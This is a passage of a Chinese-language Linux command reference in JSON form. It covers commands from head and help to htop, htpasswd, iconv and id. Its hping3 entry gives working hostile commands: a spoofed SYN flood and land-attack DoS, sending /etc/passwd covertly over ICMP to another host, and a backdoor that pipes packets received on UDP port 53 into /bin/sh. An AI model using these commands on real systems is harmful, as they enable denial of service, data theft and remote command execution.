-n ~/.bash_history ~/.bashrc\n==> /allhome/user2/.bash_history <==\n#1575425555\ncd ~\n#1575425558\nls -lh\n#1575425562\nvi ~/Desktop/ZhuangZhu-74.txt\n#1575425566\nuptime\n#1575425570\nfind ~/ -maxdepth 3 -name 'test.sh' -exec lh {} \\;\n\n==> /allhome/user2/.bashrc <==\n# .bashrc\n\n# forbid use Ctrl+D to exit shell.\nset -o ignoreeof\n\n# Source global definitions.\nif [ -f /etc/bashrc ]; then\n        . /etc/bashrc\nfi\n\n```\n\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 head`，`info coreutils 'head invocation'`。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","head"]},{"title":"【Linux 命令】help","url":"/linux-command/help/","content":"\n该命令是bash内建命令，用于显示bash内建命令的帮助信息。\n\n## 补充说明\n\n**help命令** help命令只能显示bash内建命令的帮助信息，而对于外部命令的帮助信息只能使用man或者info命令查看。\n\n###  语法\n\n```shell\nhelp(选项)(参数)\n```\n\n###  选项\n\n```shell\n-d：显示内建命令的简要描述。\n-m：按照man手册的格式输出内建命令的帮助信息。\n-s：仅输出内建命令的命令格式。\n不指定选项时：输出的帮助信息类似于-m选项，但是缺少段落名称和'SEE ALSO'，'IMPLEMENTATION'部分。\n```\n\n###  参数\n\nbash内建命令（可以为多个，请用空格分隔开）。\n\n### 常见问题\n\nQ：有哪些命令是bash内建命令？我如何判断一个命令是否为bash内建命令？\n\nA：您可以在终端使用 'man builtin' 或 'man builtins' 来获取；您可以查看bash内建命令 'type' 的帮助信息。\n\nQ：那么help命令本身的帮助信息如何获取？\n\nA：把help作为参数传给help命令；）\n\nQ：为什么echo也可以用 'man echo' 来查看帮助信息？\n\nA：因为除了bash内建的echo，GNU/linux的coreutils包里也有该命令；在echo的man手册中，DESCRIPTION段落的 'NOTE' 也提示了和同名内建的不同。\n\nPS：当你在shell脚本里定义了一个叫 'echo' 的函数，那么调用的时候优先级会如何呢？\n\n请参考 'builtin' 命令\n\nQ：我需要获得更多的bash的相关帮助信息\n\nA：限于篇幅和主题，您可以在终端执行 'man bash' ， 'info bash' ，[访问bash官方网站](http://www.gnu.org/software/bash/)，以及搜索引擎等。\n\n\n###  实例\n\n使用help命令显示shell内部shopt命令的帮助信息，输入如下命令：\n\n```shell\nhelp shopt                #获取shopt命令的帮助信息\nshopt: shopt [-pqsu] [-o long-option] optname [optname...]\n    Toggle the values of variables controlling optional behavior.\n    The -s flag means to enable (set) each OPTNAME; the -u flag\n    unsets each OPTNAME.  The -q flag suppresses output; the exit\n    status indicates whether each OPTNAME is set or unset.  The -o\n    option restricts the OPTNAMEs to those defined for use with\n    `set -o'.  With no options, or with the -p option, a list of all\n    settable options is displayed, with an indication of whether or\n    not each is set.\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","help"]},{"title":"【Linux 命令】hexdump","url":"/linux-command/hexdump/","content":"\n显示文件十六进制格式\n\n## 补充说明\n\n**hexdump命令** 一般用来查看“二进制”文件的十六进制编码，但实际上它能查看任何文件，而不只限于二进制文件。\n\n###  语法\n\n```shell\nhexdump [选项] [文件]...\n```\n\n###  选项\n\n```shell\n-n length 只格式化输入文件的前length个字节。\n-C 输出规范的十六进制和ASCII码。\n-b 单字节八进制显示。\n-c 单字节字符显示。\n-d 双字节十进制显示。\n-o 双字节八进制显示。\n-x 双字节十六进制显示。\n-s 从偏移量开始输出。\n-e 指定格式字符串，格式字符串包含在一对单引号中，格式字符串形如：'a/b \"format1\" \"format2\"'。\n```\n\n每个格式字符串由三部分组成，每个由空格分隔，第一个形如a/b，b表示对每b个输入字节应用format1格式，a表示对每a个输入字节应用format2格式，一般a>b，且b只能为1，2，4，另外a可以省略，省略则a=1。format1和format2中可以使用类似printf的格式字符串，如：\n\n```shell\n%02d：两位十进制\n%03x：三位十六进制\n%02o：两位八进制\n%c：单个字符等\n```\n\n还有一些特殊的用法：\n\n```shell\n%_ad：标记下一个输出字节的序号，用十进制表示。\n%_ax：标记下一个输出字节的序号，用十六进制表示。\n%_ao：标记下一个输出字节的序号，用八进制表示。\n%_p：对不能以常规字符显示的用 . 代替。\n```\n\n同一行如果要显示多个格式字符串，则可以跟多个`-e`选项。\n\n###  实例\n\n```shell\nhexdump -e '16/1 \"%02X \" \"  |  \"' -e '16/1 \"%_p\" \"\\n\"' test\n00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ................  \n10 11 12 13 14 15 16 17 18 19 1A 1B 1C 1D 1E 1F  |  ................  \n20 21 22 23 24 25 26 27 28 29 2A 2B 2C 2D 2E 2F  |   !\"#$%&'()*+,-./ \n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hexdump"]},{"title":"【Linux 命令】history","url":"/linux-command/history/","content":"\n显示或操作历史列表。\n\n## 概要\n\n```shell\nhistory [-c] [-d offset] [n]\nhistory -anrw [filename]\nhistory -ps arg [arg...]\n```\n\n## 主要用途\n\n- 显示历史列表。\n\n- 操作历史列表。\n\n## 选项\n\n```shell\n-c           清空历史列表。\n-d offset    根据offset删除记录。如果是正数则表示offset位置的记录，如果为负数则表示从结尾向前offset位置的记录。\n-a           将当前终端的历史记录行添加到历史记录文件。\n-n           将尚未从历史文件中读取的历史行追加到当前历史列表中。\n-r           读取历史文件，并将其内容附加到历史列表中。\n-w           将当前历史记录列表附加到历史记录文件中并且附加它们到历史列表中。\n-p           在每个arg上执行历史记录扩展并在标准输出上显示结果，而不将结果存储在历史记录列表中。\n-s           将每个arg作为单个条目附加到历史记录列表。\n```\n\n## 参数\n\nn：可选，只列出最近的n条记录。\n\nfilename：可选，表示历史文件；默认调用顺序为`filename`、环境变量`HISTFILE`、`~/.bash_history`。\n\n## 返回值\n\n返回成功，除非提供了非法选项或出现了错误。\n\n## 例子\n\n使用history命令显示最近使用的10条历史命令\n\n```shell\n[root@localhost ~]# history 10\n   92  ls\n   93  cd ..\n   94  ls\n   95  exit\n   96  ls -a\n   97  cd .ssh/\n   98  ls\n   99  cat known_hosts\n  100  exit\n  101  history 10\n```\n\n清空历史记录\n\n```shell\n[root@localhost ~]# history -c\n```\n\n更多实例:\n\n```shell\n# 执行第 n 条历史命令\n[root@localhost ~]# !n\n\n# 执行最后一条 xxx 开头的命令\n[root@localhost ~]# !xxx\n```\n\n\n### 注意\n\n1. 在命令行中，可以使用符号`!`执行指定序号的历史命令。例如，要执行第2个历史命令，则输入`!2`。\n2. 关闭终端后，历史列表将被写入历史文件`~/.bash_history`。\n3. 环境变量`HISTSIZE`决定了历史文件中命令的存储数量，默认存储1000条。\n4. 环境变量`HISTTIMEFORMAT`如果是非空值，则使用其值作为`strftime(3)`打印相关时间戳的格式字符串添加在每个显示的历史记录之前；否则不会打印时间戳。\n5. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","history"]},{"title":"【Linux 命令】host","url":"/linux-command/host/","content":"\n常用的分析域名查询工具\n\n## 补充说明\n\n**host命令** 是常用的分析域名查询工具，可以用来测试域名系统工作是否正常。\n\n###  语法\n\n```shell\nhost(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：显示详细的DNS信息；\n-c<类型>：指定查询类型，默认值为“IN“；\n-C：查询指定主机的完整的SOA记录；\n-r：在查询域名时，不使用递归的查询方式；\n-t<类型>：指定查询的域名信息类型；\n-v：显示指令执行的详细信息；\n-w：如果域名服务器没有给出应答信息，则总是等待，直到域名服务器给出应答；\n-W<时间>：指定域名查询的最长时间，如果在指定时间内域名服务器没有给出应答信息，则退出指令；\n-4：使用IPv4；\n-6：使用IPv6.\n```\n\n###  参数\n\n主机：指定要查询信息的主机信息。\n\n###  实例\n\n```shell\n[root@localhost ~]# host www.jsdig.com \nwww.jsdig.com is an alias for host.1.jsdig.com.\nhost.1.jsdig.com has address 100.42.212.8\n\n[root@localhost ~]# host -a www.jsdig.com\nTrying \"www.jsdig.com\"\n;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 34671\n;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0\n\n;; QUESTION SECTION:\n;www.jsdig.com.               IN      ANY\n\n;; ANSWER SECTION:\nwww.jsdig.com.        463     IN      CNAME   host.1.jsdig.com.\n\nReceived 54 bytes from 202.96.104.15#53 in 0 ms\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","host"]},{"title":"【Linux 命令】hostid","url":"/linux-command/hostid/","content":"\n显示当前主机的十六进制数字标识。\n\n## 概要\n\n```shell\nhostid [OPTION]...\n```\n\n## 主要用途\n\n- 显示当前主机的十六进制标识符。\n- 用来限制软件的使用权限，不可改变。\n\n## 选项\n\n```shell\n--help       显示帮助信息并退出。\n--version    显示版本信息并退出。\n```\n\n## 例子\n\n```shell\n[root@localhost ~]# hostid\n007f0100\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 hostid`，`info coreutils 'hostid invocation'`。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hostid"]},{"title":"【Linux 命令】hostname","url":"/linux-command/hostname/","content":"\n显示和设置系统的主机名\n\n## 补充说明\n\n**hostname命令** \n用于显示和设置系统的主机名称。\n\n- 环境变量 `HOSTNAME` 也保存了当前的主机名。\n- 在使用 `hostname` 命令设置主机名后，系统并不会永久保存新的主机名，重启之后还是原来的主机名。如果需要永久修改主机名，需要修改 `/etc/hosts` 和 `/etc/sysconfig/network` 的相关内容并进行重启；也可以使用 `hostnamectl` 命令进行永久修改。\n\n### 语法\n\n```shell\nhostname [-b] {hostname|-F file}           设置主机名称（或从文件获取）\nhostname [-a|-A|-d|-f|-i|-I|-s|-y]         显示格式化的名称\nhostname                                   显示主机名称\n\n{yp,nis,}domainname {nisdomain|-F file}    设置 NIS 主机名称（或从文件获取）\n{yp,nis,}domainname                        显示 NIS 主机名称\n\ndnsdomainname                              显示 DNS 主机名称\n\nhostname -V|--version|-h|--help            打印信息并退出\n```\n\n### 选项\n\n```shell\n-a, --alias               显示主机别名\n-A, --all-fqdns           显示所有FQDN名称\n-b, --boot                如果没有可用的主机名，则设置默认主机名\n-d, --domain              显示DNS域名\n-f, --fqdn, --long        显示FQDN名称\n-F, --file                从给定文件中读取主机名或NIS域名\n-i, --ip-address          显示主机的ip地址\n-I, --all-ip-addresses    显示主机所有的ip地址\n-s, --short               显示短主机名称，在第一个点处截断\n-y, --yp, --nis           显示NIS域名\n```\n\n### 实例\n\n显示主机名\n```shell\n[root@AY1307311912260196fcZ ~]# hostname\nAY1307311912260196fcZ\n```\n\n临时改变主机名\n```shell\n[root@AY1307311912260196fcZ ~]# hostname newname\n```\n\n显示主机的所有IP地址\n```shell\n[root@AY1307311912260196fcZ ~]# hostname -I\n10.17.0.1 10.18.0.10 172.17.0.1\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hostname"]},{"title":"【Linux 命令】hostnamectl","url":"/linux-command/hostnamectl/","content":"\n查询或更改系统主机名\n\n## 补充说明\n\nhostnamectl可用于查询和更改系统主机名和相关设置。\n\n### 语法\n\n```bash\nhostnamectl [选项...] 指令 ...\n```\n### 指令\n\n```bash\nstatus                 显示当前主机名设置\nset-hostname NAME      设置系统主机名\nset-icon-name NAME     设置主机的图标名称\nset-chassis NAME       设置主机的机箱类型 \nset-deployment NAME    设置主机的部署环境 \nset-location NAME      设置主机位置\n```\n\n### 选项\n\n```bash\n-h --help               显示此帮助\n    --version           显示包的版本\n    --no-ask-password   不提示输入密码\n-H --host=[USER@]HOST   在远程主机上操作\n-M --machine=CONTAINER  在本地容器上执行操作。指定要连接到的容器名称。\n--transient, --static, --pretty  \n                        如果调用了status（或者没有给出显式命令）并且指定了其中一个开关，hostnamectl将只打印出这个选定的主机名。\n```\n\n### 实例\n\n显示主机名设置\n\n```bash\n$ hostnamectl status\n```\n\n\n改变主机名(永久修改,不用重启哦~)\n\n```bash\n$ sudo hostnamectl set-hostname newname\n```\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hostnamectl"]},{"title":"【Linux 命令】hping3","url":"/linux-command/hping3/","content":"\n测试网络及主机的安全\n\n## 补充说明\n\n**hping** 是用于生成和解析TCPIP协议数据包的开源工具。创作者是Salvatore Sanfilippo。目前最新版是hping3，支持使用tcl脚本自动化地调用其API。hping是安全审计、防火墙测试等工作的标配工具。hping优势在于能够定制数据包的各个部分，因此用户可以灵活对目标机进行细致地探测。\n\n###  安装\n\n```shell\nyum install libpcap-devel tc-devel\nln -s /usr/include/pcap-bpf.h /usr/include/net/bpf.h\nwget http://www.hping.org/hping3-20051105.tar.gz\ntar zxvf hping3-20051105.tar.gz\ncd hping3-20051105\n./configure\nmake\nmake install\n```\n\n###  选项\n\n```shell\n-H --help 显示帮助。\n-v -VERSION 版本信息。\n-c --count count 发送数据包的次数 关于countreached_timeout 可以在hping2.h里编辑。\n-i --interval 包发送间隔时间（单位是毫秒）缺省时间是1秒,此功能在增加传输率上很重要,在idle/spoofing扫描时此功能也会被用到,你可以参考hping-howto获得更多信息-fast 每秒发10个数据包。\n-n -nmeric 数字输出，象征性输出主机地址。\n-q -quiet 退出。\n-I --interface interface name 无非就是eth0之类的参数。\n-v --verbose 显示很多信息，TCP回应一般如：len=46 ip=192.168.1.1 flags=RADF seq=0 ttl=255 id=0 win=0 rtt=0.4ms tos=0 iplen=40 seq=0 ack=1380893504 sum=2010 urp=0\n-D --debug 进入debug模式当你遇到麻烦时，比如用HPING遇到一些不合你习惯的时候，你可以用此模式修改HPING，（INTERFACE DETECTION,DATA LINK LAYER ACCESS,INTERFACE SETTINGS,.......）\n-z --bind 快捷键的使用。\n-Z --unbind 消除快捷键。\n-O --rawip RAWIP模式，在此模式下HPING会发送带数据的IP头。\n-1 --icmp ICMP模式，此模式下HPING会发送IGMP应答报，你可以用--ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。\n-2 --udp UDP 模式，缺省下，HPING会发送UDP报文到主机的0端口，你可以用--baseport --destport --keep选项指定其模式。\n-9 --listen signatuer hping的listen模式，用此模式，HPING会接收指定的数据。\n-a --spoof hostname 伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。\n-t --ttl time to live 可以指定发出包的TTL值。\n-H --ipproto 在RAW IP模式里选择IP协议。\n-w --WINID UNIX ,WINDIWS的id回应不同的，这选项可以让你的ID回应和WINDOWS一样。\n-r --rel 更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。\n-F --FRAG 更改包的FRAG，这可以测试对方对于包碎片的处理能力，缺省的“virtual mtu”是16字节。\n-x --morefrag 此功能可以发送碎片使主机忙于恢复碎片而造成主机的拒绝服务。\n-y -dontfrag 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。\n-G --fragoff fragment offset value set the fragment offset\n-m --mtu mtu value 用此项后ID数值变得很大，50000没指定此项时3000-20000左右。\n-G --rroute 记录路由，可以看到详悉的数据等等，最多可以经过9个路由，即使主机屏蔽了ICMP报文。\n-C --ICMPTYPE type 指定ICMP类型，缺省是ICMP echo REQUEST。\n-K --ICMPCODE CODE 指定ICMP代号，缺省0。\n--icmp-ipver 把IP版本也插入IP头。\n--icmp-iphlen 设置IP头的长度，缺省为5（32字节）。\n--icmp-iplen 设置IP包长度。\n--icmp-ipid 设置ICMP报文IP头的ID，缺省是RANDOM。\n--icmp-ipproto 设置协议的，缺省是TCP。\n-icmp-cksum 设置校验和。\n-icmp-ts alias for --icmptype 13 (to send ICMP timestamp requests)\n--icmp-addr Alias for --icmptype 17 (to send ICMP address mask requests)\n-s --baseport source port hping 用源端口猜测回应的包，它从一个基本端口计数，每收一个包，端口也加1，这规则你可以自己定义。\n-p --deskport [+][+]desk port 设置目标端口，缺省为0，一个加号设置为:每发送一个请求包到达后，端口加1，两个加号为：每发一个包，端口数加1。\n--keep 上面说过了。\n-w --win 发的大小和windows一样大，64BYTE。\n-O --tcpoff Set fake tcp data offset. Normal data offset is tcphdrlen / 4.\n-m --tcpseq 设置TCP序列数。\n-l --tcpck 设置TCP ack。\n-Q --seqnum 搜集序列号的，这对于你分析TCP序列号有很大作用。\n```\n\n###  Hping3功能\n\nHping3主要有以下典型功能应用：\n\n### #  防火墙测试\n\n使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：http://0daysecurity.com/articles/hping3_examples.html\n\n测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。\n\n```shell\nhping3 -S  -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10\n```\n\n### # 端口扫描\n\nHping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：\n\n```shell\nhping3 -I eth0  -S 192.168.10.1 -p 80\n```\n\n其中`-I eth0`指定使用eth0端口，`-S`指定TCP包的标志位SYN，`-p 80`指定探测的目的端口。\n\nhping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。\n\n### # Idle扫描\n\nIdle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。\n\n该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN/ACK，此时idle主机收到SYN/ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。\n\n### # 拒绝服务攻击\n\n使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。\n\n```shell\nhping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000\n```\n\n其他攻击如smurf、teardrop、land attack等也很容易构建出来。\n\n### # 文件传输\n\nHping3支持通过TCP/UDP/ICMP等包来进行文件传输。相当于借助TCP/UDP/ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：\n\n```shell\nhping3 192.168.1.159--listen signature --safe  --icmp\n```\n\n监听ICMP包中的签名，根据签名解析出文件内容。\n\n在发送端使用签名打包的ICMP包发送文件：\n\n```shell\nhping3 192.168.1.108--icmp ?d 100 --sign signature --file /etc/passwd\n```\n\n将`/etc/passwd`密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。\n\n### # 木马功能\n\n如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。\n\n示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用/bin/sh执行。\n\n在木马启动端：\n\n```shell\nhping3 192.168.10.66--listen signature --safe --udp -p 53 | /bin/sh\n```\n\n在远程控制端：\n\n```shell\necho ls >test.cmd\nhping3 192.168.10.44 -p53 -d 100 --udp --sign siganature --file ./test.cmd\n```\n\n将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。\n\n当然这里只是简单的演示程序，真实的场景，控制端可以利益shell执行很多的高级复杂的操作。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hping3"]},{"title":"【Linux 命令】htdigest","url":"/linux-command/htdigest/","content":"\nApache服务器内置工具\n\n## 补充说明\n\n**htdigest命令** 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用于摘要认证的密码文件。\n\n###  语法\n\n```shell\nhtdigest(选项)(参数)\n```\n\n###  选项\n\n```shell\n-c：创建密码文件。\n```\n\n###  参数\n\n*   密码文件：指定要创建或更新的密码文件；\n*   域：指定用户名所属的域；\n*   用户名：要创建或者更新的用户名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","htdigest"]},{"title":"【Linux 命令】htop","url":"/linux-command/htop/","content":"\n[非内部命令]一个互动的进程查看器，可以动态观察系统进程状况\n\n## 补充说明\n\nhtop命令 是Linux系统中的一个互动的进程查看器，一个文本模式的应用程序(在控制台或者X终端中)，需要ncurses。\n\n与Linux传统的top相比，htop更加人性化。它可让用户交互式操作，支持颜色主题，可横向或纵向滚动浏览进程列表，并支持鼠标操作。\n\n与top相比，htop有以下优点：\n\n- 可以横向或纵向滚动浏览进程列表，以便看到所有的进程和完整的命令行。\n- 在启动上，比top 更快。\n- 杀进程时不需要输入进程号。\n- htop 支持鼠标操作。\n- 两者相比起来，top比较繁琐。\n\ntop缺点：\n\n- 只支持键盘操作。\n- 显示也单调。\n\nhtop 官网：http://htop.sourceforge.net/\n\n###  语法\n\n```shell\nhtop\n```\n\n### 参数\n\n```shell\n-C --no-color               使用单色配色方案\n-d --delay=DELAY            设置更新之间的延迟，在十秒\n-s --sort-key=COLUMN        纵列排序(try --sort-key=help for a list)\n-u --user=USERNAME          只显示一个指定用户的进程\n-p --pid=PID,[,PID,PID...]  只显示给用户\n-h --help                   打印此命令帮助\n-v --version                打印版本信息\n```\n\n###  选项\n\n```shell\nh,?     F1：查看htop使用说明\nS       F2：设置\n/       F3：搜索进程\n\\       F4：过滤器，按关键字搜索\nt       F5：显示树形结构\n<,>     F6：选择排序方式\n[       F7：减少nice值，这样就可以提高对应进程的优先级\n]       F8：增加nice值，这样可以降低对应进程的优先级\nk       F9：杀掉选中的进程\nq       F10：退出htop\n\n\n/ : 搜索字符\nh : 显示帮助\nl : 显示进程打开的文件: 如果安装了lsof，按此键可以显示进程所打开的文件\nu : 显示所有用户，并可以选择某一特定用户的进程\nU : 取消标记所有的进程\ns : 将调用strace追踪进程的系统调用\nt : 显示树形结构\n\nH：显示/隐藏用户线程\nI：倒转排序顺序\nK：显示/隐藏内核线程    \nM：按内存占用排序\nP：按CPU排序    \nT：按运行时间排序\n\n上下键或PgUP， PgDn : 移动选中进程  \n左右键或Home， End : 移动列表  \nSpace(空格) : 标记/取消标记一个进程。命令可以作用于多个进程，例如 \"kill\"，将应用于所有已标记的进程  \n\n```shell\n\n\n### Htop设定\n\n鼠标点击Setup或者按下F2 之后进入htop 设定的页面\n\n#### 1. Meters\n\n设定顶端的 显示信息，分为左右两侧，Left column 表示左侧的显示的信息，Right column表示右侧显示的信息，如果要新加选项，可以选择Available meters添加，F5新增到上方左侧，F6新增到上方右侧。Left column和Right column下面的选项，可以选定信息的显示方式，有LED、Bar(进度条)、Text(文本模式)，可以根据个人喜好进行设置\n\n#### 2. Display options\n\n选择要显示的内容，按空格 x表示显示，选择完后，按F10保存\n\n#### 3. Colors\n\n设定界面以什么颜色来显示，个人认为用处不大，各人喜好不同\n\n#### 4. Colums\n\n作用是增加或取消要显示的各项内容，选择后F7(向上移动)、F8(向下移动)、F9(取消显示、F10(保存更改))此处增加了PPID、PGRP，根据各人需求，显示那些信息。\n\n**F3 搜索进程**\n\n在界面下按F3或直接输入”/”就可以直接进入搜索模式，是按照进程名进行搜索的，搜索到的进程会用设定的颜色标记出来，方便查看。\n\n**F4：过滤器**\n\n相当于模糊查找，不区分大小写，下方输入要搜索的内容后，则界面只显示搜索到的内容，更加方便查看\n\n**F5:以树形方式显示**\n\n\n**F6：排序方式**\n\n按下F6后会跳转至以树形方式显示界面，让您选择以什么方式进行排序，在Sort by下选择您要以什么来排序\n\n**F7，F8：调整进程nice值**\n\nF7表示减小nice值(增大优先级)，F8增大nice值(减小优先级)，选择某一进程，按F7或F8来增大或减小nice值，nice值范围为-20-19\n\n\n**F9：杀死进程**\n\n选择某一进程按F9即可杀死此进程，很方便\n\n**F10:退出htop**\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","htop"]},{"title":"【Linux 命令】htpasswd","url":"/linux-command/htpasswd/","content":"\napache服务器创建密码认证文件\n\n## 补充说明\n\n**htpasswd命令** 是Apache的Web服务器内置工具，用于创建和更新储存用户名、域和用户基本认证的密码文件。\n\n###  语法\n\n###  htpasswd(选项)(参数)\n\n###  选项\n\n```shell\n-c：创建一个加密文件；\n-n：不更新加密文件，只将加密后的用户名密码显示在屏幕上；\n-m：默认采用MD5算法对密码进行加密；\n-d：采用CRYPT算法对密码进行加密；\n-p：不对密码进行进行加密，即明文密码；\n-s：采用SHA算法对密码进行加密；\n-b：在命令行中一并输入用户名和密码而不是根据提示输入密码；\n-D：删除指定的用户。\n```\n\n###  参数\n\n*   用户：要创建或者更新密码的用户名；\n*   密码：用户的新密码。\n\n###  实例\n\n **利用htpasswd命令添加用户** \n\n```shell\nhtpasswd -bc .passwd www.jsdig.com php\n```\n\n在bin目录下生成一个.passwd文件，用户名www.jsdig.com，密码：php，默认采用MD5加密方式。\n\n **在原有密码文件中增加下一个用户** \n\n```shell\nhtpasswd -b .passwd Jack 123456\n```\n\n去掉`-c`选项，即可在第一个用户之后添加第二个用户，依此类推。\n\n **不更新密码文件，只显示加密后的用户名和密码** \n\n```shell\nhtpasswd -nb Jack 123456\n```\n\n不更新.passwd文件，只在屏幕上输出用户名和经过加密后的密码。\n\n **利用htpasswd命令删除用户名和密码** \n\n```shell\nhtpasswd -D .passwd Jack\n```\n\n **利用htpasswd命令修改密码** \n\n```shell\nhtpasswd -D .passwd Jack\nhtpasswd -b .passwd Jack 123456\n```\n\n即先使用htpasswd删除命令删除指定用户，再利用htpasswd添加用户命令创建用户即可实现修改密码的功能。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","htpasswd"]},{"title":"【Linux 命令】hwclock","url":"/linux-command/hwclock/","content":"\n显示与设定硬件时钟\n\n## 补充说明\n\n**hwclock命令** 是一个硬件时钟访问工具，它可以显示当前时间、设置硬件时钟的时间和设置硬件时钟为系统时间，也可设置系统时间为硬件时钟的时间。\n\n在Linux中有硬件时钟与系统时钟等两种时钟。硬件时钟是指主机板上的时钟设备，也就是通常可在BIOS画面设定的时钟。系统时钟则是指kernel中的时钟。当Linux启动时，系统时钟会去读取硬件时钟的设定，之后系统时钟即独立运作。所有Linux相关指令与函数都是读取系统时钟的设定。\n\n###  语法\n\n```shell\nhwclock(选项)\n```\n\n###  选项\n\n```shell\n--adjust：hwclock每次更改硬件时钟时，都会记录在/etc/adjtime文件中。使用--adjust参数，可使hwclock根据先前的记录来估算硬件时钟的偏差，并用来校正目前的硬件时钟；\n--debug：显示hwclock执行时详细的信息；\n--directisa：hwclock预设从/dev/rtc设备来存取硬件时钟。若无法存取时，可用此参数直接以I/O指令来存取硬件时钟；\n--hctosys：将系统时钟调整为与目前的硬件时钟一致；\n--set --date=<日期与时间>：设定硬件时钟；\n--show：显示硬件时钟的时间与日期；\n--systohc：将硬件时钟调整为与目前的系统时钟一致；\n--test：仅测试程序，而不会实际更改硬件时钟；\n--utc：若要使用格林威治时间，请加入此参数，hwclock会执行转换的工作；\n--version：显示版本信息。\n```\n\n###  实例\n\n设置硬件时间要依赖于操作系统时间，具体方法如下：\n\n```shell\nhwclock –systohc\nhwclock --systohc –-utc\n```\n\n不加任何参数使用hwclock，可以查看当前的硬件日期和时间。\n\n```shell\nhwclock\n```\n\n查看clock文件，确认是否设置了UTC：\n\n```shell\ncat /etc/default/rcS \nUTC=yes\n```\n\n在其他一些版本的Linux（如RebHat）中可以这样查看：\n\n```shell\ncat /etc/sysconfig/clock\nZONE=\"America/Los_Angeles\"\nUTC=false\nARC=false\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","hwclock"]},{"title":"【Linux 命令】iconv","url":"/linux-command/iconv/","content":"\n转换文件的编码方式\n\n## 补充说明\n\n**iconv命令** 是用来转换文件的编码方式的，比如它可以将UTF8编码的转换成GB18030的编码，反过来也行。JDK中也提供了类似的工具native2ascii。Linux下的iconv开发库包括iconv_open,iconv_close,iconv等C函数，可以用来在C/C++程序中很方便的转换字符编码，这在抓取网页的程序中很有用处，而iconv命令在调试此类程序时用得着。\n\n###  语法\n\n```shell\niconv -f encoding [-t encoding] [inputfile]... \n```\n\n###  选项\n\n```shell\n-f encoding :把字符从encoding编码开始转换。 \n-t encoding :把字符转换到encoding编码。 \n-l :列出已知的编码字符集合 \n-o file :指定输出文件 \n-c :忽略输出的非法字符 \n-s :禁止警告信息，但不是错误信息 \n--verbose :显示进度信息 \n-f和-t所能指定的合法字符在-l选项的命令里面都列出来了。 \n```\n\n###  实例\n\n列出当前支持的字符编码： \n\n```shell\niconv -l \n```\n\n将文件file1转码，转后文件输出到fil2中： \n\n```shell\niconv file1 -f EUC-JP-MS -t UTF-8 -o file2 \n```\n\n这里，没`-o`那么会输出到标准输出。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","iconv"]},{"title":"【Linux 命令】id","url":"/linux-command/id/","content":"\n打印真实以及有效的用户和所在组的信息\n\n## 概要\n\n```shell\nid [OPTION]... [USER]...\n```\n\n## 主要用途\n\n- 没有选项时，打印指定用户ID信息。\n\n## 